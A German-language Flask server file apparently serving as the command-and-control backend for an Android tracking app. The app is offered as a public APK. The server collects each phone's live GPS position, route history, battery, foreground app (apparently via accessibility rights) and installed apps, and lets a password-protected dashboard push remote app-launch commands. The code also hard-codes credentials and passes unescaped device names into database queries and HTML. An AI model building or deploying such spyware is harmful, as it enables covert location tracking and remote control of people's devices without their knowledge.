import os
import json
import time
import requests
from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

app.secret_key = os.environ.get("SECRET_KEY", "ein_zufaelliger_geheimer_schluessel_123")
GEHEIMES_PASSWORT = "192837465"

# ================= SUPABASE KONFIGURATION =================
SUPABASE_URL = "https://chdjuipbtnmgbmsorhpe.supabase.co"
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "sb_publishable_bwU_Ywvz9_Od8FPS12mk-w_bscgCvbe")
# ==========================================================

SUPABASE_HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "resolution=merge-duplicates"
}

def hole_daten_von_supabase():
    """Lädt alle aktiven Geräte aus der Supabase-Datenbank."""
    try:
        url = f"{SUPABASE_URL}/rest/v1/geraete_daten?select=*"
        antwort = requests.get(url, headers=SUPABASE_HEADERS, timeout=5)
        if antwort.status_code == 200:
            daten_liste = antwort.json()
            geraete_dict = {}
            for geraet in daten_liste:
                name = geraet["name"]
                geraete_dict[name] = {
                    "lat": float(geraet.get("lat", 51.1657)),
                    "lon": float(geraet.get("lon", 10.4515)),
                    "akku": str(geraet.get("akku", "??")),
                    "netzwerk": str(geraet.get("netzwerk", "Aktiv")),
                    "speed": str(geraet.get("speed", "0")),
                    "bedienungshilfen": str(geraet.get("bedienungshilfen", "Unbekannt")),
                    "aktuelle_app": str(geraet.get("aktuelle_app", "Keine")),
                    "installierte_apps": geraet.get("installierte_apps", "[]"),
                    "aktueller_befehl": geraet.get("aktueller_befehl", ""),
                    "historie": geraet.get("historie", []),
                    "zeitstempel": int(geraet.get("zeitstempel", int(time.time())))
                }
            return geraete_dict
    except Exception as e:
        print(f"Fehler beim Laden aus Supabase: {e}")
    return {}

@app.route('/', methods=['GET'])
def index():
    ist_eingeloggt = session.get('eingeloggt', False)
    
    login_html = ""
    if not ist_eingeloggt:
        login_html = """
        <div class="container animate-fade">
            <h2>🔒 Interner Bereich (Nur für ausgewählte Personen)</h2>
            <p>Bitte gib das Passwort ein, um die Live-Karte zu sehen:</p>
            <form action="/login" method="POST" style="display: flex; gap: 10px; max-width: 400px;">
                <input type="password" name="passwort" placeholder="Passwort eingeben..." required 
                       style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">
                <button type="submit" style="background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold;">Anmelden</button>
            </form>
        </div>
        """
    
    karte_html = ""
    javascript_html = ""
    if ist_eingeloggt:
        sichere_daten = hole_daten_von_supabase()
        json_daten = json.dumps(sichere_daten)
        
        karte_html = """
        <div class="container animate-fade">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
                <h1>🗺️ Live-Standorte & Routen aller Geräte</h1>
                <a href="/logout" style="color: #dc3545; text-decoration: none; font-weight: bold;">Abmelden 🚪</a>
            </div>
            
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; background: #e9ecef; padding: 10px; border-radius: 6px; font-size: 14px; font-weight: bold; color: #495057;">
                <div style="display: flex; gap: 20px;">
                    <div id="zeit-seit-update">⏱️ Letzter Webseiten-Abruf: Gerade eben</div>
                    <div id="zeit-bis-update">🔄 Nächstes Webseiten-Update in: 00:05</div>
                </div>
                <button onclick="datenVomServerHolen()" style="background-color: #007bff; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 12px;">Jetzt manuell aktualisieren ⚡</button>
            </div>

            <div style="background: #fff; border: 1px solid #dee2e6; border-radius: 6px; padding: 15px; margin-bottom: 15px;">
                <h3 style="margin-top: 0; margin-bottom: 10px; font-size: 16px; color: #495057;">📱 Aktive Geräte & Status:</h3>
                <div id="geraete-liste-container"><i>Keine Geräte aktiv</i></div>
            </div>
            
            <div id="map" style="height: 500px; width: 100%; border-radius: 8px;"></div>
        </div>
        """
        
        javascript_html = """
        <script>
            let map;
            let markerMap = {};
            let linienMap = {};
            let geraete = %ERSATZ_FUER_DATEN%;
            let letzterAbrufZeitstempel = Math.floor(Date.now() / 1000);

            function startKarte() {
                let centerLat = 51.1657;
                let centerLon = 10.4515;
                let zoomLevel = 5;

                const keys = Object.keys(geraete);
                if (keys.length > 0 && geraete[keys[0]]) {
                    centerLat = geraete[keys[0]].lat || centerLat;
                    centerLon = geraete[keys[0]].lon || centerLon;
                    zoomLevel = 13;
                }

                map = L.map('map').setView([centerLat, centerLon], zoomLevel);

                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '&copy; OpenStreetMap'
                }).addTo(map);

                updateUI(geraete);

                setInterval(function() {
                    const JETZT = Math.floor(Date.now() / 1000);
                    let sekundenSeitUpdate = JETZT - letzterAbrufZeitstempel;
                    let sekundenBisUpdate = 5 - sekundenSeitUpdate;

                    if (sekundenBisUpdate <= 0) {
                        datenVomServerHolen();
                        return;
                    }

                    const seitElem = document.getElementById('zeit-seit-update');
                    const bisElem = document.getElementById('zeit-bis-update');
                    if(seitElem) seitElem.innerHTML = "⏱️ Letzter Webseiten-Abruf: vor " + sekundenSeitUpdate + " Sek.";
                    if(bisElem) bisElem.innerHTML = "🔄 Nächstes Webseiten-Update in: 00:00" + sekundenBisUpdate;
                }, 1000);
            }

            function updateUI(daten) {
                if (!daten || !map) return;
                geraete = daten;
                
                for (const name in daten) {
                    const info = daten[name];
                    if (!info.lat || !info.lon) continue;

                    const popupText = "<b>" + name + "</b><br>🔋 Akku: " + info.akku + "%<br>🚀 Tempo: " + info.speed + " km/h<br>📱 App: " + info.aktuelle_app;
                    
                    if (markerMap[name]) {
                        markerMap[name].setLatLng([info.lat, info.lon]);
                        markerMap[name].getPopup().setContent(popupText);
                    } else {
                        const marker = L.marker([info.lat, info.lon]).addTo(map).bindPopup(popupText);
                        markerMap[name] = marker;
                    }

                    if (info.historie && info.historie.length > 1) {
                        if (linienMap[name]) { map.removeLayer(linienMap[name]); }
                        const linie = L.polyline(info.historie, {color: '#007bff', weight: 4, opacity: 0.7}).addTo(map);
                        linienMap[name] = linie;
                    }
                }
                
                for (const name in markerMap) {
                    if (!daten[name]) {
                        map.removeLayer(markerMap[name]);
                        delete markerMap[name];
                        if (linienMap[name]) { map.removeLayer(linienMap[name]); delete linienMap[name]; }
                    }
                }

                const container = document.getElementById('geraete-liste-container');
                if (!container) return;
                const gerateKeys = Object.keys(daten);
                
                if (gerateKeys.length === 0) {
                    container.innerHTML = "<i>Keine Geräte aktiv</i>";
                    return;
                }
                
                let html = '<ul style="list-style: none; padding: 0; margin: 0;">';
                const jetzt = Math.floor(Date.now() / 1000);
                
                for (const name in daten) {
                    const info = daten[name];
                    const ts = info.zeitstempel || jetzt;
                    const diffSekunden = jetzt - ts;
                    
                    let handyZeitText = diffSekunden < 60 ? "vor " + diffSekunden + " Sek." : "vor " + Math.floor(diffSekunden / 60) + " Min.";
                    let akkuFarbe = "#28a745"; 
                    if (parseInt(info.akku) <= 20) akkuFarbe = "#dc3545";
                    else if (parseInt(info.akku) <= 50) akkuFarbe = "#ffc107";
                    
                    html += '<li style="display: flex; justify-content: space-between; align-items: center; padding: 8px; border-bottom: 1px solid #eee; font-size: 14px;">' +
                            '<div style="display: flex; flex-wrap: wrap; gap: 12px; align-items: center;">' +
                            '<b style="color: #007bff;">🟢 ' + name + '</b> ' +
                            '<span style="color: ' + akkuFarbe + '; font-weight: bold;">🔋 ' + info.akku + '%</span>' +
                            '<span style="color: #17a2b8; font-weight: bold;">🚀 ' + info.speed + ' km/h</span>' +
                            '<span style="color: #6f42c1; font-weight: bold;">🌐 ' + info.netzwerk + '</span>' +
                            '<span style="color: #e83e8c; font-weight: bold;">📱 Offen: ' + info.aktuelle_app + '</span>' +
                            '<span style="color: #ff8c00; font-weight: bold;">♿ Systemhilfe: ' + info.bedienungshilfen + '</span>' +
                            '<span style="color: #6c757d;">📡 Funkspruch: <b>' + handyZeitText + '</b></span>' +
                            '</div>' +
                            '<div style="display: flex; gap: 10px;">' +
                            '<a href="/steuerung/' + encodeURIComponent(name) + '" style="background-color: #007bff; color: white; text-decoration: none; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: bold;">Steuerung 🛠️</a>' +
                            '<a href="/delete/' + encodeURIComponent(name) + '" style="background-color: #dc3545; color: white; text-decoration: none; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: bold;" onclick="return confirm(this.title);" title="Gerät wirklich löschen?">Löschen 🗑️</a>' +
                            '</div>' +
                            '</li>';
                }
                html += '</ul>';
                container.innerHTML = html;
            }

            function datenVomServerHolen() {
                fetch('/api/data')
                    .then(response => { if (response.status === 401) { window.location.reload(); } return response.json(); })
                    .then(neueDaten => {
                        updateUI(neueDaten);
                        letzterAbrufZeitstempel = Math.floor(Date.now() / 1000);
                        const seitElem = document.getElementById('zeit-seit-update');
                        if(seitElem) seitElem.innerHTML = "⏱️ Letzter Webseiten-Abruf: Gerade eben";
                    })
                    .catch(err => { console.error("Fehler beim Live-Update:", err); });
            }

            window.addEventListener('DOMContentLoaded', startKarte);
        </script>
        """.replace("%ERSATZ_FUER_DATEN%", json_daten)

    basis_html = """
    <html>
        <head>
            <title>App Management Dashboard</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; color: #333; }
                .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); margin-bottom: 20px; }
                #map { height: 500px; width: 100%; border-radius: 8px; background-color: #ddd; }
                .btn { display: inline-block; background-color: #28a745; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold; }
                .btn:hover { background-color: #218838; }
                .animate-fade { animation: fadeIn 0.5s ease-in; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>📲 Öffentlicher App-Download</h2>
                <p>Hier kann jeder die aktuelle Version der App auf sein Android-Smartphone laden:</p>
                <a href="/download" class="btn">📥 APK Herunterladen</a>
            </div>
            %LOGIN_BEREICH%
            %KARTE_BEREICH%
            %JAVASCRIPT_BEREICH%
        </body>
    </html>
    """
    return basis_html.replace("%LOGIN_BEREICH%", login_html).replace("%KARTE_BEREICH%", karte_html).replace("%JAVASCRIPT_BEREICH%", javascript_html)

# ================= SEPARATE STEUERUNGS-SEITE =================
@app.route('/steuerung/<name>', methods=['GET'])
def steuerungs_seite(name):
    if not session.get('eingeloggt', False):
        return redirect(url_for('index'))
        
    alle_geraete = hole_daten_von_supabase()
    if name not in alle_geraete:
        return f"<h3>Gerät '{name}' nicht gefunden.</h3><a href='/'>Zurück</a>", 404
        
    geraet = alle_geraete[name]
    raw_apps = geraet.get("installierte_apps", "[]")
    
    if isinstance(raw_apps, str):
        apps_json_string = raw_apps if raw_apps.strip() else "[]"
    else:
        apps_json_string = json.dumps(raw_apps)

    if apps_json_string == "[]" or not apps_json_string:
        apps_json_string = "[]"

    html_steuerung = """
    <html>
        <head>
            <title>Fernsteuerung - %GERAETE_NAME%</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 30px; background-color: #f4f4f9; color: #333; }
                .card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 600px; margin: 0 auto; }
                h1 { color: #007bff; font-size: 24px; margin-top: 0; }
                .status-item { font-size: 15px; margin-bottom: 10px; padding-bottom: 10px; border-bottom: 1px solid #eee; }
                select { width: 100%; padding: 12px; font-size: 16px; border: 2px solid #007bff; border-radius: 6px; margin: 20px 0; outline: none; }
                button { width: 100%; background-color: #28a745; color: white; border: none; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; }
                button:hover { background-color: #218838; }
                .back-link { display: block; text-align: center; margin-top: 20px; color: #007bff; text-decoration: none; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>🛠️ Fernsteuerungs-Zentrale</h1>
                <div class="status-item"><b>Gerät:</b> %GERAETE_NAME%</div>
                <div class="status-item"><b>Aktuelle App im Vordergrund:</b> <span style="color:#e83e8c; font-weight:bold;">%OFFENE_APP%</span></div>
                <div class="status-item"><b>Systemhilfe-Rechte:</b> %ACCESSIBILITY%</div>
                
                <p>Wähle eine installierte App aus, um sie per Remote-Befehl auf dem Handy aufzurufen:</p>
                
                <select id="appSelect">
                    <option value="">-- Bitte App auswählen --</option>
                </select>
                
                <button onclick="sendeRemoteBefehl()">🚀 App-Startbefehl abschicken</button>
                
                <a href="/" class="back-link">↩️ Zurück zur Hauptseite</a>
            </div>

            <script>
                let appListeRaw = %APPS_ARRAY%;
                const selectElement = document.getElementById('appSelect');
                
                if (typeof appListeRaw === 'string') {
                    try {
                        appListeRaw = JSON.parse(appListeRaw);
                    } catch(e) {
                        console.error("Fehler beim Parsen:", e);
                        appListeRaw = [];
                    }
                }
                
                if(Array.isArray(appListeRaw) && appListeRaw.length > 0) {
                    selectElement.innerHTML = '<option value="">-- Bitte App auswählen --</option>';
                    appListeRaw.forEach(app => {
                        const opt = document.createElement('option');
                        opt.value = app.paket;
                        opt.textContent = app.name + " (" + app.paket + ")";
                        selectElement.appendChild(opt);
                    });
                } else {
                    selectElement.innerHTML = '<option disabled selected>Keine Apps vom Gerät gemeldet</option>';
                }

                function sendeRemoteBefehl() {
                    const paketName = selectElement.value;
                    if(!paketName) {
                        alert("Bitte wähle zuerst eine App aus!");
                        return;
                    }
                    
                    if(confirm("Soll der Befehl zum Öffnen der App abgeschickt werden?")) {
                        fetch('/api/sende_befehl', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                name: "%GERAETE_NAME%",
                                paket: paketName
                            })
                        })
                        .then(res => res.json())
                        .then(data => {
                            if(data.status === "success") {
                                alert("Befehl gespeichert! Das Handy startet die App beim nächsten Funkspruch.");
                                window.location.href = "/";
                            } else {
                                alert("Fehler: " + data.error);
                            }
                        })
                        .catch(err => alert("Netzwerkfehler beim Senden."));
                    }
                }
            </script>
        </body>
    </html>
    """
    return html_steuerung.replace("%GERAETE_NAME%", name)\
                         .replace("%OFFENE_APP%", geraet["aktuelle_app"])\
                         .replace("%ACCESSIBILITY%", geraet["bedienungshilfen"])\
                         .replace("%APPS_ARRAY%", apps_json_string)

@app.route('/api/sende_befehl', methods=['POST'])
def speichere_befehl():
    if not session.get('eingeloggt', False):
        return jsonify({"error": "Nicht autorisiert"}), 401
        
    data = request.get_json() or {}
    geraete_name = data.get("name")
    ziel_paket = data.get("paket")
    
    if not geraete_name or not ziel_paket:
        return jsonify({"error": "Fehlende Parameter"}), 400
        
    befehls_payload = {
        "befehl": "oeffne_app",
        "paket": ziel_paket
    }
    
    try:
        supabase_update_url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}"
        res = requests.patch(supabase_update_url, json={"aktueller_befehl": json.dumps(befehls_payload)}, headers=SUPABASE_HEADERS, timeout=5)
        if res.status_code in [200, 204]:
            return jsonify({"status": "success"}), 200
        return jsonify({"error": "Datenbank-Fehler"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ==================================================================

@app.route('/api/data', methods=['GET'])
def get_live_data():
    if not session.get('eingeloggt', False):
        return jsonify({}), 401
    return jsonify(hole_daten_von_supabase())

@app.route('/login', methods=['POST'])
def login():
    if request.form.get('passwort') == GEHEIMES_PASSWORT:
        session['eingeloggt'] = True
    return redirect(url_for('index'))

@app.route('/logout')
def logout():
    session.pop('eingeloggt', None)
    return redirect(url_for('index'))

@app.route('/download', methods=['GET'])
def download_apk():
    return send_from_directory(directory='static', path='app.apk', as_attachment=True)

@app.route('/upload', methods=['POST'])
def upload():
    if not request.is_json:
        return jsonify({"error": "Missing JSON"}), 400
        
    data = request.get_json()
    
    roher_name = str(data.get("name", "Unbekanntes Gerät"))
    absender_ip = request.remote_addr or "IP"
    geraete_name = f"{roher_name} ({absender_ip[-4:]})"

    try:
        lat = float(data.get("lat"))
        lon = float(data.get("lon"))
    except (TypeError, ValueError):
        return jsonify({"error": "Ungültige Koordinaten"}), 400
        
    akku = str(data.get("akku", "??"))
    netzwerk = str(data.get("netzwerk", "Unbekannt"))
    speed = str(data.get("speed", "0"))
    aktuelle_app = str(data.get("aktuelle_app", "Keine App erkannt"))
    
    installierte_apps = data.get("installierte_apps", "[]")
    if isinstance(installierte_apps, (list, dict)):
        installierte_apps = json.dumps(installierte_apps)
        
    bedienungshilfen = "Aktiv" if aktuelle_app != "Keine App geöffnet" else "Inaktiv"

    historie = []
    befehl_fuer_handy = "{}"
    
    try:
        check_url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}&select=historie,aktueller_befehl"
        res = requests.get(check_url, headers=SUPABASE_HEADERS, timeout=5)
        if res.status_code == 200 and len(res.json()) > 0:
            db_eintrag = res.json()[0]
            historie = db_eintrag.get("historie", [])
            befehl_fuer_handy = db_eintrag.get("aktueller_befehl", "{}")
    except Exception as e:
        print(f"Fehler beim Historie/Befehl-Abruf: {e}")

    historie.append([lat, lon])
    if len(historie) > 15:
        historie.pop(0)

    payload = {
        "name": geraete_name,
        "lat": lat,
        "lon": lon,
        "akku": akku,
        "netzwerk": netzwerk,
        "speed": speed,
        "bedienungshilfen": bedienungshilfen,
        "aktuelle_app": aktuelle_app,
        "installierte_apps": installierte_apps,
        "historie": historie,
        "zeitstempel": int(time.time())
    }

    try:
        # 🔥 KORREKTUR: on_conflict Parameter angehängt für automatisches Überschreiben
        supabase_post_url = f"{SUPABASE_URL}/rest/v1/geraete_daten?on_conflict=name"
        headers_upsert = SUPABASE_HEADERS.copy()
        headers_upsert["Prefer"] = "return=representation,resolution=merge-duplicates"
        
        response = requests.post(supabase_post_url, json=payload, headers=headers_upsert, timeout=5)
        if response.status_code in [200, 201]:
            if befehl_fuer_handy and befehl_fuer_handy != "{}":
                try:
                    requests.patch(f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}", json={"aktueller_befehl": ""}, headers=SUPABASE_HEADERS, timeout=3)
                except Exception:
                    pass
            return befehl_fuer_handy, 200
        else:
            print(f"Supabase Fehler-Antwort: {response.text}")
            return jsonify({"error": "Supabase-Fehler"}), 500
    except Exception as e:
        print(f"Fehler beim Senden an Supabase: {e}")
        return jsonify({"error": "Verbindungsfehler"}), 500

@app.route('/delete/<name>', methods=['GET', 'POST'])
def delete_device(name):
    if session.get('eingeloggt', False):
        try:
            delete_url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{name}"
            requests.delete(delete_url, headers=SUPABASE_HEADERS, timeout=5)
        except Exception as e:
            print(f"Fehler beim Löschen in Supabase: {e}")
    return redirect(url_for('index'))
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
